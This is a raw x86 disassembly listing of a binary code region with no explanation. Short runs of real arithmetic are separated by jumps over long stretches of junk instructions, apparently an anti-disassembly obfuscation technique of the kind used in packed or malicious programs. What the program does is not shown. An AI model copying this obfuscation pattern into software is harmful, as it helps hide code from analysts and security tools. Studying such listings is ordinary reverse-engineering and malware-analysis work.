  40cf96:	jl     0x40cf70
  40cf98:	pop    esi
  40cf99:	ret    
  40cf9a:	ja     0x40cf1f
  40cf9c:	jne    0x40cf4b
  40cf9e:	rcr    BYTE PTR [eax],cl
  40cfa0:	xchg   BYTE PTR [ecx],dh
  40cfa2:	sub    dh,al
  40cfa4:	mov    DWORD PTR [ebp+0x8],eax
  40cfa7:	mov    eax,DWORD PTR [ebp-0x18]
  40cfaa:	xor    eax,ecx
  40cfac:	add    eax,edx
  40cfae:	mov    edx,DWORD PTR [ebp+0x14]
  40cfb1:	imul   eax,DWORD PTR [edx]
  40cfb4:	mov    edx,DWORD PTR [ebp-0x4]
  40cfb7:	jmp    0x40d115
  40cfbc:	inc    bx
  40cfbe:	sbb    BYTE PTR [ebx+0x7b7d4d3d],dh
  40cfc4:	gs pop ss
  40cfc6:	jae    0x40cf71
  40cfc8:	inc    esp
  40cfc9:	cmp    bh,BYTE PTR [eax+0x6f]
  40cfcc:	dec    esp
  40cfcd:	mov    DWORD PTR [esi+0x7e],edi
  40cfd0:	aas    
  40cfd1:	jg     0x40d051
  40cfd3:	jle    0x40cfb7
  40cfd5:	fstp   TBYTE PTR [ebp+0x47]
  40cfd8:	and    ch,BYTE PTR [edi]
  40cfda:	call   0x42ad6b69
  40cfdf:	pop    ebx
  40cfe0:	mov    al,ds:0x18d540cf
  40cfe5:	cdq    
  40cfe6:	cwde   
  40cfe7:	cmp    ebp,DWORD PTR [ebx+0x3f5a39dc]
  40cfed:	jbe    0x40cf82
  40cfef:	call   0x76e1:0x863674f2
  40cff6:	and    DWORD PTR [esi-0x72e8178d],ebx
  40cffc:	stos   BYTE PTR es:[edi],al
  40cffd:	out    0x65,al
  40cfff:	ret    
  40d000:	pop    ss
  40d001:	mov    eax,0x33d9139c
  40d006:	out    0x9a,al
  40d008:	out    0xab,al
  40d00a:	pop    edi
  40d00b:	lock retf 0x31bb
  40d00f:	out    dx,al
  40d010:	mov    ah,0x3a
  40d012:	add    edx,esi
  40d014:	clc    
  40d015:	mov    bl,0xea
  40d017:	sub    cl,BYTE PTR [ecx+0xa]
  40d01a:	ret    0x34fc
  40d01d:	inc    edi
  40d01e:	and    BYTE PTR [ebx-0x24a2b2f0],0x18
  40d025:	and    ebp,ebx
  40d027:	data16 jl 0x40cfec
  40d02a:	push   0x0
  40d02c:	cmp    ecx,DWORD PTR ss:[eax]
  40d02f:	je     0x40cfd7
  40d031:	push   ecx
  40d032:	test   DWORD PTR [ecx],ecx
  40d034:	stc    
  40d035:	pop    eax
  40d036:	mov    dh,0x7d
  40d038:	lea    esi,[edi-0x4eb1f41d]
  40d03e:	mov    al,0x99
  40d040:	add    al,0x2b
  40d042:	cmc    
  40d043:	out    0xea,al
  40d045:	or     BYTE PTR [esi],dl
  40d047:	test   eax,0x517b5982
  40d04c:	and    al,0x1b
  40d04e:	fsub   st(6),st
  40d050:	(bad)  
  40d051:	ficomp WORD PTR [ebp-0x75cf1f35]
  40d057:	pop    eax
  40d058:	rol    BYTE PTR [esi+0x96f5994],1
  40d05e:	push   cs
  40d05f:	mov    bl,0xce
  40d061:	int    0x29
  40d063:	xchg   ebp,eax
  40d064:	outs   dx,BYTE PTR ds:[esi]
  40d065:	sti    
  40d066:	mov    edx,0xaa6c5024
  40d06b:	aaa    
  40d06c:	adc    ah,ah
  40d06e:	mov    dh,0xd1
  40d070:	sbb    al,0xfc
  40d072:	dec    esp
  40d073:	int3   
  40d074:	xchg   ebp,eax
  40d075:	lods   eax,DWORD PTR ds:[esi]
  40d076:	mov    cl,0x8b
  40d078:	adc    DWORD PTR [eax+0x55],eax
  40d07b:	fwait
  40d07c:	imul   esi,ebx,0xa3dc6eed
  40d082:	xchg   DWORD PTR [ecx],ebx
  40d084:	loop   0x40d03a
  40d086:	jmp    0x40d0f1
  40d088:	fadd   QWORD PTR [eax+edi*1]
  40d08b:	and    BYTE PTR [ecx-0x41739ddc],dh
  40d091:	outs   dx,DWORD PTR ds:[esi]
  40d092:	xchg   edx,eax
  40d093:	cwde   
  40d094:	mov    ch,0xca
  40d096:	das    
  40d097:	(bad)  
  40d099:	adc    eax,0x8a87ddb6
  40d09e:	push   ss
  40d09f:	mov    dh,0xfb
  40d0a1:	or     edi,DWORD PTR [ecx]
  40d0a3:	push   ss
  40d0a4:	mov    bh,0x36
  40d0a6:	test   DWORD PTR [esi-0x45],edi
  40d0a9:	shl    DWORD PTR [esp+ecx*1],0x85
  40d0ad:	stos   BYTE PTR es:[edi],al
  40d0ae:	add    al,0x41
  40d0b0:	mov    bl,0x57
  40d0b2:	cmp    DWORD PTR [eax-0x77],esp
  40d0b5:	in     eax,0x50
  40d0b7:	daa    
  40d0b8:	(bad)  
  40d0b9:	mov    ds:0x26c838d1,al
  40d0be:	xor    edi,esi
  40d0c0:	clc    
  40d0c1:	jp     0x40d127
  40d0c3:	cmp    cl,bl
  40d0c5:	je     0x40d09f
  40d0c7:	mov    cl,0xcd
  40d0c9:	or     edx,ebp
  40d0cb:	pop    ebx
  40d0cc:	out    dx,al
  40d0cd:	lds    edi,FWORD PTR ds:0x9bcae141
  40d0d3:	mov    ds:0x8074b23b,eax
  40d0d8:	xchg   ebx,eax
  40d0d9:	out    dx,al
  40d0da:	sbb    DWORD PTR [edi-0x6510ddac],ebx
  40d0e0:	out    dx,eax
  40d0e1:	mul    BYTE PTR ds:0x7aca2077
  40d0e7:	test   DWORD PTR ds:0xbcf5b296,ebp
  40d0ed:	aaa    
  40d0ee:	jge    0x40d09c
  40d0f0:	sub    edi,ebx
  40d0f2:	mov    ds:0x47593c,eax
  40d0f7:	inc    ebx
  40d0f8:	push   ebp
  40d0f9:	ds je  0x40d0e8
  40d0fc:	xor    al,0xb4
  40d0fe:	pusha  
  40d0ff:	sub    cl,BYTE PTR [eax]
  40d101:	imul   esp,DWORD PTR [ebx+0x64d075a3],0xffffffe0
  40d108:	and    DWORD PTR [eax],0xaff7fc9d
  40d10e:	mov    esi,0x33673f9a
  40d113:	pop    ds
  40d114:	pop    ss
  40d115:	xor    edx,ecx
  40d117:	mov    ecx,DWORD PTR [ebp+0x8]
  40d11a:	lea    ecx,[edx+ecx*1+0x32729d]
  40d121:	cmp    ecx,eax
  40d123:	je     0x40d712
  40d129:	mov    edi,DWORD PTR [ebp-0x18]
  40d12c:	mov    eax,DWORD PTR [ebp+0x8]
  40d12f:	mov    edx,DWORD PTR [ebp+0x14]
  40d132:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d136:	mov    ecx,0x7510856
  40d13b:	xor    edx,edx
  40d13d:	xor    edi,ecx
  40d13f:	mov    esi,0x32729d
  40d144:	add    edi,esi
  40d146:	div    edi
  40d148:	mov    edx,DWORD PTR [ebp-0x4]
  40d14b:	xor    edx,ecx
  40d14d:	jmp    0x40d2ab
  40d152:	jno    0x40d19e
  40d154:	cmp    eax,ecx
  40d156:	jge    0x40d1b9
  40d158:	in     eax,dx
  40d159:	pop    edx
  40d15a:	xor    ch,0xa8
  40d15d:	sub    BYTE PTR [edi+0x5c],0xc
  40d161:	ins    DWORD PTR es:[edi],dx
  40d162:	or     eax,0x3f7e7e8b
  40d167:	jg     0x40d1e7
  40d169:	jle    0x40d1bc
  40d16b:	(bad)  
  40d16d:	dec    eax
  40d16e:	(bad)  
  40d16f:	xchg   esp,eax
  40d170:	pushf  
  40d171:	sub    dh,bl
  40d173:	fiadd  WORD PTR [edx]
  40d175:	in     eax,dx
  40d176:	out    0xd3,eax
  40d178:	es scas eax,DWORD PTR es:[di]
  40d17b:	dec    esi
  40d17c:	jp     0x40d102
  40d17e:	rcr    BYTE PTR fs:[edx],1
  40d181:	imul   edx,DWORD PTR [ecx-0x526e20ce],0x51
  40d188:	out    dx,eax
  40d189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d18a:	js     0x40d20a
  40d18c:	fisttp DWORD PTR [ecx+0x6eec5b57]
  40d192:	mov    cl,0x72
  40d194:	int    0x76
  40d196:	in     eax,0xf1
  40d198:	fsub   st(1),st
  40d19a:	jne    0x40d1e0
  40d19c:	push   ebx
  40d19d:	dec    ecx
  40d19e:	ds int3 
  40d1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a1:	and    eax,0xd200fa13
  40d1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1a7:	add    eax,0x4fa71f09
  40d1ac:	cli    
  40d1ad:	rol    DWORD PTR [esi],0x38
  40d1b0:	in     eax,0x7a
  40d1b2:	addr16 in al,dx
  40d1b4:	cli    
  40d1b5:	mov    esp,0xb6a3c895
  40d1ba:	cmp    dl,ah
  40d1bc:	dec    eax
  40d1bd:	inc    edi
  40d1be:	pop    es
  40d1bf:	mov    dh,0x60
  40d1c1:	mov    cl,0xa3
  40d1c3:	push   esp
  40d1c4:	pop    es
  40d1c5:	cmp    ch,dl
  40d1c7:	cmc    
  40d1c8:	or     bl,BYTE PTR [edx-0x8]
  40d1cb:	idiv   DWORD PTR ss:[ebx-0x29385fc9]
  40d1d2:	aam    0x16
  40d1d4:	pushf  
  40d1d5:	cli    
  40d1d6:	mov    BYTE PTR [ecx-0x6227220a],bh
  40d1dc:	inc    esp
  40d1dd:	push   0x9cc1b538
  40d1e2:	fistp  DWORD PTR [ecx-0x3fac076d]
  40d1e8:	ret    
  40d1e9:	imul   esi,DWORD PTR [ebx-0x5af38b37],0xffffffd6
  40d1f0:	push   ds
  40d1f1:	jo     0x40d251
  40d1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1f4:	inc    edx
  40d1f5:	dec    esi
  40d1f6:	enter  0xff9f,0xa8
  40d1fa:	push   edi
  40d1fb:	cmp    edi,edi
  40d1fd:	div    BYTE PTR [edi+eiz*1+0x2160948]
  40d204:	(bad)  
  40d205:	(bad)  
  40d206:	(bad)  
  40d207:	sbb    al,0x3d
  40d209:	(bad)  
  40d20a:	pop    ebx
  40d20b:	sub    BYTE PTR [edi],dl
  40d20d:	push   ecx
  40d20e:	jmp    0x40d1d9
  40d210:	psadbw mm4,QWORD PTR ds:0xccfd5aec
  40d217:	fild   DWORD PTR [esi+0x2371881b]
  40d21d:	icebp  
  40d21e:	add    esp,0xbd942bc0
  40d224:	pushf  
  40d225:	sub    eax,0x3835a6e3
  40d22a:	inc    esi
  40d22b:	(bad)  
  40d22c:	and    eax,0xfd8f8992
  40d231:	sub    BYTE PTR [ebp+eax*8-0x2f],al
  40d235:	sbb    eax,0x169ecc58
  40d23a:	mov    ch,BYTE PTR [edx-0x56]
  40d23d:	jne    0x40d259
  40d23f:	push   0xc
  40d241:	enter  0x4da3,0xd
  40d245:	inc    ebp
  40d246:	idiv   DWORD PTR [edi]
  40d248:	cld    
  40d249:	ja     0x40d247
  40d24b:	dec    esp
  40d24c:	mov    edx,0xd556c234
  40d251:	retf   0x555f
  40d254:	aaa    
  40d255:	push   eax
  40d256:	inc    ebp
  40d257:	retf   
  40d258:	stos   DWORD PTR es:[edi],eax
  40d259:	add    DWORD PTR [ebx],eax
  40d25b:	mov    ebp,0x42cfdbd
  40d260:	sub    eax,0x2a8678d7
  40d265:	out    0xb5,eax
  40d267:	add    BYTE PTR [ebp+0x603b49a5],al
  40d26d:	mov    esp,0x14cd270b
  40d272:	fld    QWORD PTR [edi+0x5c]
  40d275:	xor    al,0x44
  40d277:	push   0xbdda768c
  40d27c:	popa   
  40d27d:	pushf  
  40d27e:	into   
  40d27f:	nop
  40d280:	fimul  WORD PTR [edx-0x58b7ed7a]
  40d286:	sar    ch,0xe0
  40d289:	mov    bh,ah
  40d28b:	jecxz  0x40d25b
  40d28d:	mov    bh,0x63
  40d28f:	in     eax,dx
  40d290:	js     0x40d228
  40d292:	sbb    eax,0xc1a88546
  40d297:	cmp    BYTE PTR [ecx+0x5602366c],ch
  40d29d:	lock lods eax,DWORD PTR ds:[esi]
  40d29f:	add    eax,0x97721b8f
  40d2a4:	fst    DWORD PTR [edx]
  40d2a6:	jns    0x40d26f
  40d2a8:	pop    esi
  40d2a9:	push   ebx
  40d2aa:	adc    DWORD PTR [ebp+0x729d0284],ecx
  40d2b0:	xor    al,BYTE PTR [eax]
  40d2b2:	mov    edx,DWORD PTR [ebp+0x8]
  40d2b5:	mov    edi,DWORD PTR [ebp-0x24]
  40d2b8:	mov    DWORD PTR [edi+edx*4],eax
  40d2bb:	mov    eax,DWORD PTR [ebp-0x18]
  40d2be:	mov    edx,DWORD PTR [ebp+0x8]
  40d2c1:	xor    eax,ecx
  40d2c3:	lea    eax,[eax+edx*1+0x32729d]
  40d2ca:	mov    DWORD PTR [ebp+0x8],eax
  40d2cd:	mov    eax,DWORD PTR [ebp-0x18]
  40d2d0:	jmp    0x40d42e
  40d2d5:	cs adc al,0xbd
  40d2d8:	jecxz  0x40d297
  40d2da:	jnp    0x40d354
  40d2dc:	aad    0x3a
  40d2de:	lock mov al,0x98
  40d2e1:	jnp    0x40d2b5
  40d2e3:	sub    ch,BYTE PTR [esi]
  40d2e5:	into   
  40d2e6:	mov    WORD PTR [esi+0x7e],?
  40d2e9:	aas    
  40d2ea:	jg     0x40d36a
  40d2ec:	jle    0x40d330
  40d2ee:	aaa    
  40d2ef:	adc    al,0xff
  40d2f1:	(bad)  
  40d2f2:	cld    
  40d2f3:	loop   0x40d2f9
  40d2f5:	int3   
  40d2f6:	jg     0x40d290
  40d2f8:	mov    bl,0x8b
  40d2fa:	arpl   WORD PTR [edi+ecx*4],sp
  40d2fd:	cld    
  40d2fe:	ficom  WORD PTR [esi-0x54]
  40d302:	rcl    ch,cl
  40d304:	out    dx,al
  40d305:	outs   dx,DWORD PTR ds:[esi]
  40d306:	fist   DWORD PTR [bp+di+0x1892]
  40d30b:	(bad)  
  40d30c:	jmp    0x11d4:0x22a8f007
  40d313:	push   edi
  40d314:	ret    
  40d315:	push   edi
  40d316:	mul    BYTE PTR [ebx-0x59]
  40d319:	pop    esp
  40d31a:	inc    edx
  40d31b:	jecxz  0x40d2e4
  40d31d:	setge  dh
  40d320:	mov    esp,0xff3bfd0f
  40d325:	inc    ebx
  40d326:	dec    esp
  40d327:	xor    al,0xbe
  40d329:	repz jmp 0x40d36a
  40d32c:	sbb    dh,bh
  40d32e:	ins    DWORD PTR es:[edi],dx
  40d32f:	out    dx,eax
  40d330:	js     0x40d2f9
  40d332:	pop    esi
  40d333:	mov    eax,0x1e1b52a8
  40d338:	aaa    
  40d339:	shr    BYTE PTR [eax],1
  40d33b:	mov    ecx,0x6799c423
  40d340:	adc    esp,DWORD PTR [edi+eiz*8]
  40d343:	adc    esi,DWORD PTR [esi+0x66]
  40d346:	js     0x40d384
  40d348:	stc    
  40d349:	inc    eax
  40d34a:	outs   dx,DWORD PTR ds:[esi]
  40d34b:	fs or  eax,0xa9861d9a
  40d351:	les    edx,FWORD PTR [ecx-0x3ec042e6]
  40d357:	mov    al,0xb
  40d359:	lock sub cl,bl
  40d35c:	dec    esp
  40d35d:	xor    edx,ebx
  40d35f:	jne    0x40d37d
  40d361:	pusha  
  40d362:	mul    DWORD PTR [edi+0x3d]
  40d365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d366:	(bad)  
  40d367:	mov    esp,0xe993ceb9
  40d36c:	outs   dx,DWORD PTR ds:[esi]
  40d36d:	nop    esi
  40d370:	loope  0x40d3b2
  40d372:	imul   DWORD PTR gs:[edx-0x418fc8dd]
  40d379:	pop    ebx
  40d37a:	outs   dx,BYTE PTR ds:[esi]
  40d37b:	cwde   
  40d37c:	jne    0x40d339
  40d37e:	nop
  40d37f:	adc    cl,bl
  40d381:	ss lock push eax
  40d384:	sub    DWORD PTR ds:0x439a5b23,0x47
  40d38b:	pop    edi
  40d38c:	nop
  40d38d:	jo     0x40d3ea
  40d38f:	mov    es,WORD PTR [ecx+0x38]
  40d392:	push   ecx
  40d393:	sbb    eax,0x54c2d029
  40d398:	mov    ah,bh
  40d39a:	scas   eax,DWORD PTR es:[edi]
  40d39b:	push   es
  40d39c:	jne    0x40d3d8
  40d39e:	aas    
  40d39f:	jae    0x40d41f
  40d3a1:	dec    edx
  40d3a2:	outs   dx,BYTE PTR ds:[esi]
  40d3a3:	das    
  40d3a4:	shl    DWORD PTR [edi-0x1a8ab272],0x38
  40d3ab:	jmp    0x40d32d
  40d3ad:	stos   DWORD PTR es:[edi],eax
  40d3ae:	dec    ecx
  40d3af:	and    ebp,esp
  40d3b1:	repz inc esi
  40d3b3:	call   0x3a59:0xd2c4928
  40d3ba:	and    BYTE PTR [edx],dl
  40d3bc:	jl     0x40d38d
  40d3be:	imul   ebp,DWORD PTR [eax-0x37164a33],0xffffffb9
  40d3c5:	jl     0x40d3b6
  40d3c7:	imul   ebp,esi,0xffffffb4
  40d3ca:	jmp    0x3fd7:0x2aa95c1f
  40d3d1:	sub    al,0x4b
  40d3d3:	sar    edi,cl
  40d3d5:	pop    eax
  40d3d6:	adc    al,BYTE PTR cs:[ecx]
  40d3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3da:	arpl   WORD PTR [esp+ecx*2+0x418ef577],cx
  40d3e1:	outs   dx,BYTE PTR ds:[esi]
  40d3e2:	or     eax,0x1ebb66d4
  40d3e7:	sbb    ah,BYTE PTR [esi+0x6d]
  40d3ea:	scas   eax,DWORD PTR es:[edi]
  40d3eb:	sub    DWORD PTR [esi],0x3ce8816f
  40d3f1:	sub    dl,bh
  40d3f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3f4:	(bad)  
  40d3f6:	dec    ebx
  40d3f7:	jge    0x40d3cf
  40d3f9:	sbb    eax,0xa8e31661
  40d3fe:	push   ebx
  40d3ff:	cmp    BYTE PTR [ebp+0xa852033],ch
  40d405:	adc    DWORD PTR [esi-0x2a],edi
  40d408:	retf   
  40d409:	outs   dx,DWORD PTR ds:[esi]
  40d40a:	adc    eax,0x8fde6964
  40d40f:	cdq    
  40d410:	cld    
  40d411:	mov    ebp,0xd1b84a21
  40d416:	(bad)  
  40d417:	cmc    
  40d418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d419:	jo     0x40d3f6
  40d41b:	mov    edi,ebp
  40d41d:	loope  0x40d3ac
  40d41f:	push   cs
  40d420:	dec    edx
  40d421:	mov    ds:0x502d000f,al
  40d426:	cmp    DWORD PTR gs:[ebp-0x3e8026d1],edx
  40d42d:	fwait
  40d42e:	mov    edx,DWORD PTR [ebp+0x14]
  40d431:	xor    eax,ecx
  40d433:	add    eax,esi
  40d435:	imul   eax,DWORD PTR [edx]
  40d438:	jmp    0x40d596
  40d43d:	into   
  40d43e:	jb     0x40d482
  40d440:	pop    ecx
  40d441:	inc    edx
  40d442:	pop    ecx
  40d443:	fisttp QWORD PTR [ebp+0x677a88e4]
  40d449:	es in  eax,dx
  40d44b:	lods   eax,DWORD PTR ds:[esi]
  40d44c:	ins    BYTE PTR es:[edi],dx
  40d44d:	(bad)  
  40d44e:	lea    edi,[esi+0x7e]
  40d451:	aas    
  40d452:	jg     0x40d4d2
  40d454:	jle    0x40d3ff
  40d456:	loopne 0x40d417
  40d458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d459:	sbb    al,0xef
  40d45b:	cs push es
  40d45d:	xlat   BYTE PTR cs:[ebx]
  40d45f:	xor    eax,0x73f38f19
  40d464:	stc    
  40d465:	xchg   esp,eax
  40d466:	stos   DWORD PTR es:[edi],eax
  40d467:	and    BYTE PTR [edi],0x3
  40d46a:	lods   eax,DWORD PTR ds:[esi]
  40d46b:	fcomp  QWORD PTR [ecx+eax*2+0x753aa499]
  40d472:	jne    0x40d47e
  40d474:	(bad)  
  40d475:	cmc    
  40d476:	and    eax,0x86f2a9e2
  40d47b:	xor    DWORD PTR [ecx],ebx
  40d47d:	test   DWORD PTR [ecx+0xe],0xefa0678f
  40d484:	or     ah,dh
  40d486:	jnp    0x40d4d4
  40d488:	dec    ebp
  40d489:	psrad  mm0,QWORD PTR [edx+0x3a77e910]
  40d490:	push   ss
  40d491:	pop    es
  40d492:	lock loopne 0x40d426
  40d495:	push   ecx
  40d496:	cmp    DWORD PTR [edx+0x50],esp
  40d499:	sbb    esi,DWORD PTR [ebp+0x52]
  40d49c:	xor    al,0x8a
  40d49e:	add    DWORD PTR [ecx],0x406f4e56
  40d4a4:	gs mov esi,0xa5e58256
  40d4aa:	shl    DWORD PTR [esi-0x7],cl
  40d4ad:	mov    eax,ds:0xd4500a38
  40d4b2:	pop    ds
  40d4b3:	imul   ebx,eax,0x0
  40d4b6:	mov    ?,WORD PTR [ebp-0x27b381ff]
  40d4bc:	mov    ds:0x91032436,eax
  40d4c1:	popa   
  40d4c2:	add    ebx,eax
  40d4c4:	popa   
  40d4c5:	cs push eax
  40d4c7:	ror    al,1
  40d4c9:	pop    esi
  40d4ca:	sbb    dl,dh
  40d4cc:	pop    eax
  40d4cd:	call   0x2364:0x77c21f60
  40d4d4:	add    DWORD PTR [eax+0x10],ebx
  40d4d7:	out    0x29,al
  40d4d9:	mov    ch,0x4d
  40d4db:	mov    bl,0x0
  40d4dd:	loope  0x40d47b
  40d4df:	fmulp  st(5),st
  40d4e1:	mov    ss,ebp
  40d4e3:	ret    
  40d4e4:	jmp    0x14b1e452
  40d4e9:	hlt    
  40d4ea:	sub    DWORD PTR [eax],ebp
  40d4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4ed:	push   esp
  40d4ee:	(bad)  
  40d4ef:	xchg   ebp,eax
  40d4f0:	pop    ebp
  40d4f1:	inc    esi
  40d4f2:	dec    eax
  40d4f3:	push   ebp
  40d4f4:	or     BYTE PTR [ebx],al
  40d4f6:	push   eax
  40d4f7:	fwait
  40d4f8:	ins    BYTE PTR es:[edi],dx
  40d4f9:	or     bl,BYTE PTR [esi]
  40d4fb:	cmp    BYTE PTR [ebx+ebp*4-0x18f72e4f],al
  40d502:	inc    edi
  40d503:	sbb    BYTE PTR [edi-0x21],cl
  40d506:	pop    eax
  40d507:	fs fucom st(6)
  40d50a:	test   al,0x86
  40d50c:	lods   al,BYTE PTR ds:[esi]
  40d50d:	push   edi
  40d50e:	out    dx,al
  40d50f:	(bad)
  40d513:	or     cl,BYTE PTR ds:0xe0a89a7c
  40d519:	or     eax,0x9b5f52ad
  40d51e:	sbb    DWORD PTR [ebx+ecx*4+0x76],ebx
  40d522:	xor    ecx,DWORD PTR [edi+0x4f]
  40d525:	pop    ss
  40d526:	and    eax,0xeef3dc11
  40d52b:	outs   dx,BYTE PTR ds:[esi]
  40d52c:	jmp    0xf754a3b0
  40d531:	cmp    eax,0x61419d8c
  40d536:	inc    edx
  40d537:	xchg   edx,eax
  40d538:	shl    BYTE PTR [ebx-0x23],1
  40d53b:	iret   
  40d53c:	push   cs
  40d53d:	aam    0xf2
  40d53f:	fld    DWORD PTR [ecx+0x1f]
  40d542:	adc    dl,BYTE PTR [eax+0x74]
  40d545:	jmp    FWORD PTR [edi]
  40d547:	jmp    0x33fbb465
  40d54c:	or     eax,0x611562fa
  40d551:	fs (bad) 
  40d553:	sbb    DWORD PTR [esi+0x1f241966],ecx
  40d559:	xchg   DWORD PTR [ebp+0x3e],edi
  40d55c:	nop
  40d55d:	repz int3 
  40d55f:	daa    
  40d560:	hlt    
  40d561:	lea    edi,[ebx+edx*4-0x173f2b99]
  40d568:	inc    ebp
  40d569:	rcl    BYTE PTR [eax+edx*2],cl
  40d56c:	rol    DWORD PTR [ebp+0xa3ed51e],0x8
  40d573:	in     al,dx
  40d574:	sbb    BYTE PTR [eax+0x37],dl
  40d577:	sub    BYTE PTR [esp+edi*8-0x40],bh
  40d57b:	inc    ebp
  40d57c:	mov    al,0x9
  40d57e:	pop    eax
  40d57f:	aas    
  40d580:	push   cs
  40d581:	das    
  40d582:	mov    esi,0x10503dbd
  40d587:	ret    
  40d588:	jecxz  0x40d51f
  40d58a:	add    DWORD PTR [edi],eax
  40d58c:	jmp    0x3c6:0x7c01f1c9
  40d593:	aad    0x2a
  40d595:	test   DWORD PTR [ebx+0x59e9fc55],ecx
  40d59b:	add    DWORD PTR [eax],eax
  40d59d:	add    bh,ah
  40d59f:	idiv   DWORD PTR [edx]
  40d5a1:	push   ss
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xf13cfe4c
  40d5ac:	sbb    eax,0x7e8e40ad
  40d5b1:	jle    0x40d5f2
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d53b
  40d5b7:	and    cl,BYTE PTR [edx]
  40d5b9:	icebp  
  40d5ba:	sub    bh,BYTE PTR [edx+0x1d]
  40d5bd:	xchg   ebp,eax
  40d5be:	cmp    ecx,ecx
  40d5c0:	jnp    0x40d637
  40d5c2:	jge    0x40d580
  40d5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5c5:	je     0x40d550
  40d5c7:	out    dx,al
  40d5c8:	(bad)  
  40d5c9:	jmp    0x280c:0x578e242e
  40d5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d1:	or     eax,0xd949c72b
  40d5d6:	outs   dx,BYTE PTR ds:[esi]
  40d5d7:	mov    bl,0xd0
  40d5d9:	jmp    0x96ae:0x34159464
  40d5e0:	(bad)  
  40d5e1:	bound  eax,QWORD PTR [ecx]
  40d5e3:	call   0x14e9:0xd578ce1a
  40d5ea:	scas   eax,DWORD PTR es:[edi]
  40d5eb:	sti    
  40d5ec:	mov    ds:0x1d21a90f,al
  40d5f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5f2:	or     BYTE PTR ds:0xeeed5c3f,0x7e
  40d5f9:	outs   dx,DWORD PTR ds:[esi]
  40d5fa:	add    eax,0xc2803ef2
  40d5ff:	je     0x40d65c
  40d601:	loope  0x40d63d
  40d603:	imul   al
  40d605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d606:	pop    es
  40d607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d608:	fsubr  DWORD PTR [edi]
  40d60a:	or     eax,0x7da9eaaf
  40d60f:	lahf   
  40d610:	aas    
  40d611:	push   0xec2ef73e
  40d616:	xlat   BYTE PTR ds:[bx]
  40d618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d619:	inc    ecx
  40d61a:	jmp    0x44080505
  40d61f:	jle    0x40d5ee
  40d621:	test   dl,bl
  40d623:	xchg   ecx,eax
  40d624:	stos   DWORD PTR es:[edi],eax
  40d625:	(bad)  
  40d626:	loope  0x40d5c3
  40d628:	jne    0x40d60f
  40d62a:	add    al,0xd5
  40d62c:	adc    BYTE PTR [edx+0x4d72261e],ch
  40d632:	and    eax,0x754c78f0
  40d637:	fdivr  QWORD PTR [edx]
  40d639:	push   ds
  40d63a:	mov    edi,0x98797e1
  40d63f:	mov    edx,DWORD PTR [ebx+0x1b]
  40d642:	adc    DWORD PTR [edi-0xd],esp
  40d645:	adc    edx,ecx
  40d647:	jmp    0x40d688
  40d649:	jnp    0x40d608
  40d64b:	shl    BYTE PTR [edx+eax*2+0x6a],0x35
  40d650:	add    al,0xf4
  40d652:	sbb    ch,al
  40d654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d655:	js     0x40d5d7
  40d657:	and    edx,DWORD PTR [ebp-0x24785532]
  40d65d:	dec    ecx
  40d65e:	jo     0x40d5e3
  40d660:	(bad)  
  40d661:	mov    dh,0xfb
  40d663:	sbb    eax,0xbeb2b1ca
  40d668:	test   BYTE PTR [ebx+0x28],bl
  40d66b:	setg   BYTE PTR [ebx+0x71114bd8]
  40d672:	mov    esi,0xab22f61c
  40d677:	shl    BYTE PTR [esi-0x34dc74cd],0x63
  40d67e:	mov    ebx,0x3c8580e6
  40d683:	sbb    eax,0x14437471
  40d688:	test   eax,0xf1d48a6f
  40d68d:	jp     0x40d698
  40d68f:	dec    ebx
  40d690:	cmp    DWORD PTR [ebx-0x41],eax
  40d693:	push   0xfd35353a
  40d698:	mov    edx,0xb1adf37f
  40d69d:	nop
  40d69e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d69f:	test   DWORD PTR [esi+edx*8],0x86a05182
  40d6a6:	sbb    esp,edx
  40d6a8:	cbw    
  40d6aa:	repnz pop ss
  40d6ac:	dec    edi
  40d6ad:	add    eax,DWORD PTR [ebp-0x28]
  40d6b0:	dec    esi
  40d6b1:	cld    
  40d6b2:	or     eax,0x53ef955a
  40d6b7:	adc    cl,bh
  40d6b9:	aaa    
  40d6ba:	pop    ss
  40d6bb:	and    dh,BYTE PTR [esi]
  40d6bd:	rcl    BYTE PTR [edi+0x1615b8db],1
  40d6c3:	ja     0x40d68a
  40d6c5:	gs dec edx
  40d6c7:	and    edi,DWORD PTR [eax+eax*8+0x5c6e9c5d]
  40d6ce:	and    al,0xf8
  40d6d0:	imul   edi,DWORD PTR [ebp-0x3723cbfb],0xfffffff3
  40d6d7:	push   ebp
  40d6d8:	dec    ebp
  40d6d9:	push   ebp
  40d6da:	sub    BYTE PTR [ebx+0xcbba3c3],al
  40d6e0:	and    DWORD PTR [edx-0xd],ebx
  40d6e3:	sub    BYTE PTR [ebx+edx*1],bl
  40d6e6:	lock int3 
  40d6e8:	pushf  
  40d6e9:	cld    
  40d6ea:	cli    
  40d6eb:	jno    0x40d6a7
  40d6ed:	sub    DWORD PTR [esi-0x2b8466cc],0x38
  40d6f4:	add    al,0x4b
  40d6f6:	xor    BYTE PTR [ebx],0xd1
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
